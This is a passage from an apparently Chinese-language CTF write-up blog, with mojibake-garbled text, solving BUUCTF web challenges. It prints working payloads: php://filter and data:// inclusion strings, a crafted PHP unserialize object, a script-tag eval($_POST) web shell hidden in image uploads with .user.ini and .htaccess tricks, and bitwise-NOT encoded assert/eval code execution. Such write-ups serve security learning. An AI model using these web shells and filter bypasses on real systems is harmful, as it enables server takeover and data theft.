<p>file_get_contents()å‡½æ•°æ˜¯å°†æ–‡ä»¶å†…å®¹è¯»å–åˆ°å˜é‡ï¼Œè€Œè¿™é‡Œæ˜¯ä»å˜é‡è¯»å–ï¼Œè¯»å–textå˜é‡çš„å€¼ï¼Œè¿™é‡Œéœ€è¦textå˜é‡ä¸º<code>welcome to the zjctf</code></p>
<p>ä½†æ˜¯å› ä¸ºå¯èƒ½å­˜åœ¨å¯¹å˜é‡çš„æ­£åˆ™åŒ¹é…ï¼Œè¿‡æ»¤ï¼Œä¸€èˆ¬æ˜¯ç”¨base64ç»•è¿‡</p>
<p>è¿™é‡Œå°±å¯ä»¥åˆ©ç”¨ä¸¤ä¸ªä¼ªåè®®ï¼Œphp:&#x2F;&#x2F;inputå’Œdata:&#x2F;&#x2F;ï¼Œè¿™ä¸¤ä¸ªä¸€ä¸ªæ˜¯è¯»å–postæ•°æ®ï¼Œä¸€ä¸ªæ˜¯è¯»å–getæ•°æ®ï¼Œè¿™é‡Œç”¨data:&#x2F;&#x2F;åè®®</p>
<figure class="highlight xl"><table><tr><td class="code"><pre><span class="line">?<span class="keyword">text</span>=<span class="keyword">data</span>:<span class="comment">//text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</span></span><br></pre></td></tr></table></figure>

<p>å½“ç„¶è¿™é‡Œä¸ç”¨base64ä¹Ÿå¯ä»¥</p>
<figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line">?<span class="keyword">text</span>=data://<span class="keyword">text</span>/plain;welcome <span class="built_in">to</span> <span class="keyword">the</span> zjctf</span><br></pre></td></tr></table></figure>

<p>ç¬¬äºŒä¸ª</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//useless.php</span></span><br></pre></td></tr></table></figure>

<p>ä¸€ä¸ªæ–‡ä»¶åŒ…å«ï¼Œå°è¯•ç”¨php:&#x2F;&#x2F;filterè¯»å–<code>useless.php</code></p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line">&amp;<span class="keyword">file</span>=php://<span class="built_in">filter</span>/<span class="keyword">read</span>=conver.base64-encode/resource=useless.php</span><br></pre></td></tr></table></figure>

<p>è‡³äºpasswordï¼ŒçŒœæµ‹åº”è¯¥æ˜¯åœ¨useless.phpé‡Œæ‰æœ‰çº¿ç´¢ï¼Œå…ˆèµ‹å€¼1çœ‹çœ‹</p>
<p>äºæ˜¯å…ˆæ„é€ ä¸€ä¸ªpayload</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">?<span class="type">text</span>=data://<span class="type">text</span>/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=php://<span class="keyword">filter</span>/<span class="keyword">read</span>=convert.base64-encode/resource=useless.php&amp;<span class="keyword">password</span>=<span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°<code>useless.php</code>å†…å®¹</p>
<p><img src="/post/wp-buuctf/image-20220823175723137.png" alt="image-20220823175723137"></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">PD9waHAgIAoKY2xhc3MgRmxhZ3sgIC8vZmxhZy5waHAgIAogICAgcHVibGljICRmaWxlOyAgCiAgICBwdWJsaWMgZnVuY3Rpb24gX190b3N0cmluZygpeyAgCiAgICAgICAgaWYoaXNzZXQoJHRoaXMtPmZpbGUpKXsgIAogICAgICAgICAgICBlY2hvIGZpbGVfZ2V0X2NvbnRlbnRzKCR0aGlzLT5maWxlKTsgCiAgICAgICAgICAgIGVjaG8gIjxicj4iOwogICAgICAgIHJldHVybiAoIlUgUiBTTyBDTE9TRSAhLy8vQ09NRSBPTiBQTFoiKTsKICAgICAgICB9ICAKICAgIH0gIAp9ICAKPz4gIAo</span><br><span class="line"></span><br><span class="line">è§£ç å</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure>

<p>å†çœ‹çœ‹passwordå˜é‡</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$password</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$password</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$password</span>;</span><br></pre></td></tr></table></figure>
<p>è¿™é‡Œç”¨äº†ååºåˆ—åŒ–ï¼Œæ‰€ä»¥passwordå°±æ˜¯åºåˆ—åŒ–åçš„å€¼</p>
<p>åˆ©ç”¨<code>useless.php</code>æ„é€ åºåˆ—åŒ–</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123; </span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>=<span class="string">&quot;flag.php&quot;</span> ;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="variable">$password</span> = <span class="keyword">new</span> <span class="title class_">Flag</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$password</span>);</span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure>

<p>è¿è¡Œå        </p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">O</span>:<span class="number">4</span>:<span class="string">&quot;Flag&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;file&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;flag.php&quot;</span>;&#125;  </span><br></pre></td></tr></table></figure>

<p>æœ€åpayload</p>
<figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">?<span class="type">text</span>=data://<span class="type">text</span>/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;<span class="keyword">password</span>=O:<span class="number">4</span>:&quot;Flag&quot;:<span class="number">1</span>:&#123;s:<span class="number">4</span>:&quot;file&quot;;s:<span class="number">8</span>:&quot;flag.php&quot;;&#125;</span><br><span class="line"></span><br><span class="line">//ä»”ç»†ä¸€ä¸‹ä¼šæ³¨æ„åˆ°è¿™é‡Œçš„fileçš„å€¼ä¸­ï¼Œä¼ªåè®®åˆ é™¤äº†ï¼Œ</span><br><span class="line">è¿™æ˜¯å› ä¸ºå¼€å§‹é»˜è®¤éƒ½æ˜¯<span class="keyword">index</span>.phpï¼Œä½†æ˜¯<span class="keyword">index</span>.phpæ²¡æœ‰Flagç±»ï¼Œ</span><br><span class="line">å¦‚æœæƒ³æ‰§è¡Œååºåˆ—åŒ–ï¼Œé‚£å°±éœ€è¦åŒ…å«Flagç±»ï¼Œä¹Ÿå°±æ˜¯è¿™é‡Œçš„useless.phpé‡Œçš„</span><br><span class="line">æ‰€ä»¥è¿™é‡Œåˆ é™¤fileé‡Œçš„ä¼ªåè®®ï¼Œåªç•™useless.phpçš„æ–‡ä»¶å</span><br><span class="line">å°±æ˜¯åˆ©ç”¨  <span class="keyword">include</span>($file); </span><br><span class="line">æŠŠuseless.phpåŒ…å«åœ¨<span class="keyword">index</span>.phpé‡Œï¼Œä»è€Œå¯ä»¥æˆåŠŸæ‰§è¡Œååºåˆ—åŒ–ï¼Œå¾—åˆ°flag</span><br></pre></td></tr></table></figure>

<p>å¾—åˆ°flag</p>
<h2 id="9-SUCTF-2019-CheckIn"><a href="#9-SUCTF-2019-CheckIn" class="headerlink" title="9.[SUCTF 2019]CheckIn"></a>9.[SUCTF 2019]CheckIn</h2><h3 id="1-é¢˜ç›®æè¿°-6"><a href="#1-é¢˜ç›®æè¿°-6" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>æ— </p>
<h3 id="2-wp-6"><a href="#2-wp-6" class="headerlink" title="2)wp"></a>2)wp</h3><p>å…ˆä¸Šä¼ ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶è¯•è¯•</p>
<p><img src="/post/wp-buuctf/image-20220825173012665.png" alt="image-20220825173012665"></p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">exif_imagetypeæ˜¯åˆ¤æ–­ä¸€ä¸ªå›¾åƒçš„ç±»å‹çš„è¿›ç¨‹ã€‚</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥åªèƒ½ä¸Šä¼ å›¾ç‰‡</p>
<p>å…ˆä¸Šä¼ ä¸€ä¸ªåŒ…å«PHPæœ¨é©¬çš„å›¾ç‰‡é©¬è¯•è¯•</p>
<p><img src="/post/wp-buuctf/image-20220825174837632.png" alt="image-20220825174837632"></p>
<p>çœ‹æ¥æ˜¯è¿‡æ»¤äº†<code>&lt;?</code>ï¼Œæ‰€ä»¥é™¤äº†php,å…¶ä»–çš„asp,aspx,jsp,jséƒ½å¯ä»¥ç»•è¿‡</p>
<p>è¿™é‡Œä»¥jsä¸¾ä¾‹</p>
<p>åˆ›å»ºä¸€ä¸ªjsæ–‡ä»¶ï¼Œå†…å®¹ä¸º</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;@<span class="built_in">eval</span>($_POST[<span class="string">&quot;cmd&quot;</span>]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>åœ¨å’Œä¸€ä¸ªæ™®é€šå›¾ç‰‡åˆæˆï¼Œä¹Ÿå¯ä»¥åŠ ä¸ªæ–‡ä»¶å¤´GIF89a</p>
<p>å›¾ç‰‡é©¬åä¸º<code>haha.gif</code></p>
<p>ç„¶åä¸Šä¼ </p>
<p><img src="/post/wp-buuctf/image-20220825210858681.png" alt="image-20220825210858681"></p>
<p>ç”±äºä¸æ˜¯phpæœ¨é©¬ï¼Œæ‰€ä»¥æ— æ³•ç”¨<code>.htaccess</code>æ–‡ä»¶ç»•è¿‡</p>
<p>è¿™é‡Œå°±éœ€è¦ç”¨<code>.user.ini</code>é…ç½®æ–‡ä»¶,å½“ç„¶ä½¿ç”¨å‰ææ˜¯<code>.user.ini</code>æ–‡ä»¶ä¸‹æœ‰phpæ–‡ä»¶ï¼Œä¸ç„¶ä¹Ÿä¸èƒ½åŒ…å«äº†</p>
<p>æ¨èçœ‹ä¸€ä¸‹è¿™ç¯‡<a href="https://wooyun.js.org/drops/user.ini%E6%96%87%E4%BB%B6%E6%9E%84%E6%88%90%E7%9A%84PHP%E5%90%8E%E9%97%A8.html">æ–‡ç« </a></p>
<p><strong>åœ¨æœåŠ¡å™¨ä¸­ï¼Œåªè¦æ˜¯è¿ç”¨äº†fastcgiçš„æœåŠ¡å™¨å°±èƒ½å¤Ÿåˆ©ç”¨è¯¥æ–¹å¼getshellï¼Œä¸è®ºæ˜¯apacheæˆ–è€…ngnixæˆ–æ˜¯å…¶ä»–æœåŠ¡å™¨ã€‚</strong></p>
<p> <strong>è¿™ä¸ªæ–‡ä»¶æ˜¯php.iniçš„è¡¥å……æ–‡ä»¶ï¼Œå½“ç½‘é¡µè®¿é—®çš„æ—¶å€™å°±ä¼šè‡ªåŠ¨æŸ¥çœ‹å½“å‰ç›®å½•ä¸‹æ˜¯å¦æœ‰.user.iniï¼Œç„¶åå°†å…¶è¡¥å……è¿›php.iniï¼Œå¹¶ä½œä¸ºcgiçš„å¯åŠ¨é¡¹ã€‚</strong></p>
<p> <strong>å…¶ä¸­å¾ˆå¤šåŠŸèƒ½è®¾ç½®äº†åªèƒ½php.inié…ç½®ï¼Œä½†æ˜¯è¿˜æ˜¯æœ‰ä¸€äº›å±é™©çš„åŠŸèƒ½å¯ä»¥è¢«æˆ‘ä»¬æ§åˆ¶ï¼Œæ¯”å¦‚auto_prepend_fileã€‚</strong></p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line"><span class="built_in">auto</span>_append_fileã€<span class="built_in">auto</span>_prepend_file:æŒ‡å®šä¸€ä¸ªæ–‡ä»¶ï¼Œè‡ªåŠ¨åŒ…å«åœ¨è¦æ‰§è¡Œçš„æ–‡ä»¶å‰ï¼Œç±»ä¼¼äºåœ¨æ–‡ä»¶å‰è°ƒç”¨äº†require()å‡½æ•°ã€‚è€Œ<span class="built_in">auto</span>_append_fileç±»ä¼¼ï¼Œåªæ˜¯åœ¨æ–‡ä»¶åé¢åŒ…å«ã€‚ </span><br><span class="line"></span><br><span class="line">ä½¿ç”¨æ–¹æ³•å¾ˆç®€å•ï¼Œç›´æ¥å†™åœ¨.user.iniä¸­ï¼š</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥è¿™é‡Œè®¾ç½®è‡ªåŠ¨åŒ…å«çš„æ–‡ä»¶ä¸º<code>haha.gif</code></p>
<p>äºæ˜¯<code>.user.ini</code>å†…å®¹ä¸º</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">GIF89a       <span class="comment">//ç»•è¿‡å›¾ç‰‡åˆ¤æ–­         </span></span><br><span class="line"><span class="built_in">auto</span>_prepend_file=haha.gif</span><br></pre></td></tr></table></figure>

<p>ä¸Šä¼ <code>.user.ini</code></p>
<p><img src="/post/wp-buuctf/image-20220825214029074.png" alt="image-20220825214029074"></p>
<p>è¿™ä¸ªæ—¶å€™haha.gifå°±å·²ç»åŒ…å«åœ¨index.phpï¼Œå¯ä»¥è®¿é—®</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">9</span>c7a4b64-<span class="number">1</span>c49-<span class="number">4</span>ee4-a146-dc6763b5ce1c.node4.buuoj.cn:<span class="number">81</span>/uploads/c47b21fcf8f0bc8b3920541abd8024fd/index.php</span><br></pre></td></tr></table></figure>

<p>èƒ½çœ‹åˆ°<code>GIF98a?</code></p>
<p>ç„¶åä¹Ÿå¯ä»¥ç”¨hackbarï¼Œpostä¸Šä¼ å‘½ä»¤ï¼Œå¦‚å›¾ä¸­çš„phpinfo()</p>
<p><img src="/post/wp-buuctf/image-20220825215617387.png" alt="image-20220825215617387"></p>
<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">cmd</span><span class="operator">=</span>var_dump(scandir(<span class="string">&quot;/&quot;</span>))<span class="comment">;//çœ‹çœ‹æ ¹ç›®å½•ï¼Œæ‰¾åˆ°flag</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/wp-buuctf/image-20220825220933577.png" alt="image-20220825220933577"></p>
<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">cmd</span><span class="operator">=</span>var_dump(file_get_contents(<span class="string">&quot;/flag&quot;</span>))<span class="comment">;//è¯»å–flagæ–‡ä»¶</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/wp-buuctf/image-20220825221229971.png" alt="image-20220825221229971"></p>
<hr>
<p>å½“ç„¶ç”¨èšå‰‘æœ€ç®€å•ï¼Œè¿æ¥ä¹ŸæˆåŠŸ</p>
<p><img src="/post/wp-buuctf/image-20220825214728996.png" alt="image-20220825214728996"></p>
<p>å¯ä»¥çœ‹åˆ°<strong>index.phpæ–‡ä»¶ä¹Ÿåœ¨ä¸Šä¼ çš„ç›®å½•</strong>ä¸‹ï¼Œä¹Ÿå°±æ˜¯<code>.user.ini</code>çš„åŒä¸€ä¸ªç›®å½•ä¸‹ï¼Œæ‰€ä»¥æ‰å¯ä»¥æˆåŠŸåŒ…å«</p>
<p><img src="/post/wp-buuctf/image-20220825215454619.png" alt="image-20220825215454619"></p>
<p>åœ¨æ ¹ç›®å½•å‘ç°äº†flagï¼Œæ‰“å¼€å³å¯å¾—åˆ°flag</p>
<hr>
<p>ä½†æˆ‘å‘ç°æ ¹ç›®å½•ä¸€ä¸ªclean.shæ–‡ä»¶ï¼Œè¿™æ˜¯ä¸€ä¸ªå®šæ—¶æ¸…ç©ºlinuxæœåŠ¡å™¨ä¸Šç¼“å­˜çš„æ–‡ä»¶è„šæœ¬ï¼Œä¸Šä¼ çš„æ–‡ä»¶ä¼šè¢«å®šæ—¶åˆ é™¤</p>
<p><img src="/post/wp-buuctf/image-20220825215047906.png" alt="image-20220825215047906"></p>
<p>è¿™æ˜¯ä¸€åˆ†é’Ÿå·¦å³åï¼Œé¶åœºç¯å¢ƒè¿˜åœ¨ä½†æ˜¯æ— æ³•è®¿é—®äº†ï¼Œæ‰€ä»¥è¦å¿«ç‚¹æ‹¿å–flag</p>
<p><img src="/post/wp-buuctf/image-20220825215220524.png" alt="image-20220825215220524"></p>
<p>è¿™é‡Œæœ¬æ¥æƒ³åˆ æ‰clean.shï¼Œå‘ç°æ²¡æƒé™ï¼Œæ— æ³•æ‰§è¡Œï¼Œsudoä¹Ÿä¸è¡Œï¼Œé‚£å°±åªèƒ½é€Ÿæˆ˜é€Ÿå†³äº†</p>
<p><img src="/post/wp-buuctf/image-20220825220024393.png" alt="image-20220825220024393"></p>
<p>æ ¹ç›®å½•å¾—åˆ°flag</p>
<h2 id="10-GXYCTF2019-BabyUpload"><a href="#10-GXYCTF2019-BabyUpload" class="headerlink" title="10.[GXYCTF2019]BabyUpload"></a>10.[GXYCTF2019]BabyUpload</h2><h3 id="1-é¢˜ç›®æè¿°-7"><a href="#1-é¢˜ç›®æè¿°-7" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>æ— </p>
<h3 id="2-wp-7"><a href="#2-wp-7" class="headerlink" title="2)wp"></a>2)wp</h3><p>è¿™é“é¢˜ä¸éš¾ï¼Œä½†æ˜¯å¼€å§‹ä¸æ¸…æ¥šè¿˜æ˜¯ä¸çŸ¥é“è¿‡æ»¤äº†ä»€ä¹ˆï¼Œ</p>
<p>è¿™é“é¢˜ä»‹ç»å‡ ä¸ªç‚¹å°±å¯ä»¥äº†</p>
<p>ç¬¬ä¸€ä¸ªæ˜¯è¿‡æ»¤äº†åç¼€åå«ph</p>
<p>ç¬¬äºŒä¹Ÿæ˜¯å…³é”®çš„ï¼Œå®ƒåªå…è®¸ä¸Šä¼ <code>content-type: image/jpeg</code>ï¼Œpngå’Œgiféƒ½ä¸å¯ä»¥</p>
<p>ç¬¬ä¸‰ç‚¹å°±æ˜¯å®ƒè¿‡æ»¤äº†æ–‡ä»¶å†…å®¹é‡Œå«<code>&lt;?</code></p>
<p>æ‰€ä»¥ä¸Šä¼ ä¸€ä¸ªjpegæ–‡ä»¶ï¼ŒæŠ“åŒ…ä¿®æ”¹å†…å®¹ä¸ºéphpä½†åŒ…å«phpçš„ä¸€ä¸ªè„šæœ¬ï¼Œ</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;@<span class="built_in">eval</span>($_POST[<span class="string">&quot;cmd&quot;</span>]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>å†ä¸Šä¼ .htaccessæ–‡ä»¶ï¼Œè§£ææ‰€æœ‰æ–‡ä»¶ä¸ºphp</p>
<p>ç”¨èšå‰‘è¿æ¥jpegæ–‡ä»¶ï¼Œå³å¯</p>
<h2 id="11-æå®¢å¤§æŒ‘æˆ˜-2019-RCE-ME"><a href="#11-æå®¢å¤§æŒ‘æˆ˜-2019-RCE-ME" class="headerlink" title="11.[æå®¢å¤§æŒ‘æˆ˜ 2019]RCE ME"></a>11.[æå®¢å¤§æŒ‘æˆ˜ 2019]RCE ME</h2><h3 id="1-é¢˜ç›®æè¿°-8"><a href="#1-é¢˜ç›®æè¿°-8" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>æ— </p>
<h3 id="2-wp-8"><a href="#2-wp-8" class="headerlink" title="2)wp"></a>2)wp</h3><p>å…ˆå¯¹ä»£ç åˆ†æ</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">            <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">                    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>)&gt;<span class="number">40</span>)&#123;</span><br><span class="line">                                        <span class="keyword">die</span>(<span class="string">&quot;This is too Long.&quot;</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">                                        <span class="keyword">die</span>(<span class="string">&quot;NO.&quot;</span>);</span><br><span class="line">                                                &#125;</span><br><span class="line">                    @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ?&gt;</span></span><br></pre></td></tr></table></figure>

<p>å¯ä»¥çœ‹åˆ°codeè¢«æ­£åˆ™åŒ¹é…ï¼Œæ‰€ä»¥å­—æ¯å¤§å°å†™å’Œæ•°å­—éƒ½ä¸èƒ½è¾“å…¥</p>
<p>è¿™é‡Œå°±å­¦åˆ°æ–°ä¸œè¥¿äº†</p>
<p><strong>å–åç»•è¿‡</strong></p>
<p><u><strong>å–å</strong>å°±æ˜¯å°†æ•°å­—è½¬åŒ–ä¸ºäºŒè¿›åˆ¶,å†æŠŠäºŒè¿›åˆ¶ä¸­çš„1å˜æˆ0,0å˜æˆ1</u></p>
<p><code>~</code>æ˜¯å–åç¬¦å·ï¼Œ</p>
<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">echo urlencode(~<span class="string">&#x27;assert&#x27;</span>);</span><br><span class="line">echo urlencode(~<span class="string">&#x27;eval($_REQUEST[8])&#x27;</span>);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">ç»“æœï¼š</span><br><span class="line">%9E%8C%8C%9A%8D%8B</span><br><span class="line">%9A%89%9E%93%D7%DB%A0%AD%BA%AE%AA%BA%AC%AB%A4%C7%A2%D6</span><br><span class="line"></span><br><span class="line"><span class="comment">//phpæ–­è¨€ï¼šassert â€” æ£€æŸ¥ä¸€ä¸ªæ–­è¨€æ˜¯å¦ä¸º falseï¼Œå¦‚æœå‚æ•°æ˜¯å­—ç¬¦ä¸²ï¼Œå®ƒå°†ä¼šè¢« assert() å½“åš PHP ä»£ç æ¥æ‰§è¡Œ</span></span><br></pre></td></tr></table></figure>

<p>ç„¶åå†èµ‹å€¼</p>
<figure class="highlight mel"><table><tr><td class="code"><pre><span class="line">?code=(~%9E%8C%8C%9A%8D%8B)(~%9A%89%9E%93%D7%DB%A0%AD%BA%AE%AA%BA%AC%AB%A4%C7%A2%D6);</span><br><span class="line"></span><br><span class="line"><span class="comment">//æ³¨æ„åé¢è¦æœ‰ï¼›ï¼Œä»£è¡¨phpä»£ç ç»“æŸ</span></span><br><span class="line"><span class="comment">//è¿™é‡Œ~æ˜¯å–åï¼Œä¹‹å‰urlencodeé‡Œå–åäº†ä¸€æ¬¡ï¼Œèµ‹å€¼æ—¶å†å–åä¸€æ¬¡ï¼Œç›¸å½“äºæ²¡æœ‰å–å</span></span><br><span class="line"></span><br><span class="line">ç­‰åŒäº</span><br><span class="line"></span><br><span class="line">?code=(assert)(<span class="keyword">eval</span>($_REQUEST[<span class="number">8</span>]));</span><br><span class="line"></span><br><span class="line">(assert)å› ä¸ºæ˜¯assertæ˜¯å‡½æ•°ï¼Œè¢«å½“ä½œå‡½æ•°æ‰§è¡Œï¼Œäºæ˜¯å› ä¸ºæ–­è¨€(<span class="keyword">eval</span>($_REQUEST[<span class="number">8</span>]))ï¼Œæ‰€ä»¥æŠŠ<span class="keyword">eval</span>($_REQUEST[<span class="number">8</span>])å½“ä½œphpæ‰§è¡Œï¼Œäºæ˜¯å°±å¯ä»¥æ‹¿åˆ°shelläº†</span><br></pre></td></tr></table></figure>



<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">èšå‰‘è¿æ¥</span><br><span class="line"><span class="symbol">http:</span>//url?code<span class="operator">=</span>(~<span class="variable">%9</span>E<span class="variable">%8</span>C<span class="variable">%8</span>C<span class="variable">%9</span>A<span class="variable">%8</span>D<span class="variable">%8</span>B)(~<span class="variable">%9</span>A<span class="variable">%89</span><span class="variable">%9</span>E<span class="variable">%93</span><span class="variable">%D7</span><span class="variable">%DB</span><span class="variable">%A0</span><span class="variable">%AD</span><span class="variable">%BA</span><span class="variable">%AE</span><span class="variable">%AA</span><span class="variable">%BA</span><span class="variable">%AC</span><span class="variable">%AB</span><span class="variable">%A4</span><span class="variable">%C7</span><span class="variable">%A2</span><span class="variable">%D6</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯å‘ç°flagæ˜¯ç©ºçš„</p>
<p><img src="/post/wp-buuctf/image-20220903181221552.png" alt="image-20220903181221552"></p>
<p>çœ‹äº†å…¶ä»–å¤§ä½¬çš„wpæ‰çŸ¥é“ï¼Œéœ€è¦èšå‰‘æ’ä»¶<code>disable_functions</code>ï¼Œç¦æ­¢ç½‘ç«™çš„å‡½æ•°ï¼Œé˜²æ­¢å…¶é˜»æ­¢è¯»å–flag</p>
<p><img src="/post/wp-buuctf/image-20220903181348649.png" alt="image-20220903181348649"></p>
<p>å†åœ¨ä¸»é¡µå³é”®</p>
<p><img src="/post/wp-buuctf/image-20220903181431745.png" alt="image-20220903181431745"></p>
<p>æ¨¡å¼é€‰æ‹©</p>
<p><img src="/post/wp-buuctf/image-20220903181451266.png" alt="image-20220903181451266"></p>
<p>ç„¶åç‚¹å‡»å¼€å§‹</p>
<p>ç»ˆç«¯è¾“å…¥</p>
<p><code>/readflag</code></p>
<p><img src="/post/wp-buuctf/image-20220903181528195.png" alt="image-20220903181528195"></p>
<p>å¾—åˆ°flag</p>
<h2 id="12-GXYCTF2019-BabySQli"><a href="#12-GXYCTF2019-BabySQli" class="headerlink" title="12.[GXYCTF2019]BabySQli"></a>12.[GXYCTF2019]BabySQli</h2><h3 id="1-é¢˜ç›®æè¿°-9"><a href="#1-é¢˜ç›®æè¿°-9" class="headerlink" title="1)é¢˜ç›®æè¿°"></a>1)é¢˜ç›®æè¿°</h3><p>æ— </p>
<h3 id="2-wp-9"><a href="#2-wp-9" class="headerlink" title="2)wp"></a>2)wp</h3><p>å¼€å§‹æ˜¯ä¸€ä¸ªç™»å½•æ¡†</p>
<p><img src="/post/wp-buuctf/image-20220909203922998.png" alt="image-20220909203922998"></p>
<p>æˆ‘ä»¬éšä¾¿è¾“å…¥ä¸€ä¸ªè´¦å·å¯†ç </p>
<figure class="highlight nsis"><table><tr><td class="code"><pre><span class="line">è´¦å·ï¼š<span class="literal">admin</span></span><br><span class="line">å¯†ç ï¼š<span class="number">123456</span></span><br></pre></td></tr></table></figure>

<p><img src="/post/wp-buuctf/image-20220909204018695.png" alt="image-20220909204018695"></p>
<p>æŠ¥é”™ï¼Œçœ‹æ¥ç”¨æˆ·åæ²¡é”™ï¼Œå¯†ç é”™è¯¯</p>
<p>æŸ¥çœ‹æºç çœ‹çœ‹</p>
<p><img src="/post/wp-buuctf/image-20220909204046072.png" alt="image-20220909204046072"></p>
<p>å‘ç°æœ‰ä¸€ä¸²åŠ å¯†å­—ç¬¦ï¼Œçœ‹èµ·æ¥åƒbase</p>
<p>å…ˆç”¨<code>base32</code></p>
<p><img src="/post/wp-buuctf/image-20220909204202994.png" alt="image-20220909204202994"></p>
<p>çœ‹èµ·æ¥å°±æ˜¯<code>base32+base64</code>æ··åˆç¼–ç ï¼Œå†ç”¨<code>base64</code></p>
<p><img src="/post/wp-buuctf/image-20220909204325138.png" alt="image-20220909204325138"></p>
<hr>
